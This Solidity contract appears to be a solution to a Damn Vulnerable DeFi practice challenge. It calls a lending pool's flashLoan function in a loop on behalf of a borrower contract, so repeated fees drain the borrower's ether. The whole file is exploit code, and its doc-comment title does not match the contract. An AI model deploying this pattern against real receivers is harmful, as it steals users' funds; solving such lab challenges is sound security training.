// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract attackerContract {
    using Address for address;

    // Function called by the pool during flash loan
    function attack(address pool, address borrower) public payable {
        uint256 i;
        uint256 amount = borrower.balance / 1e18;
        for (i=0; i<amount; i++) {
            pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    borrower,
                    1 
                )
            );
        }
    }

    // Allow deposits of ETH
    receive () external payable {}
}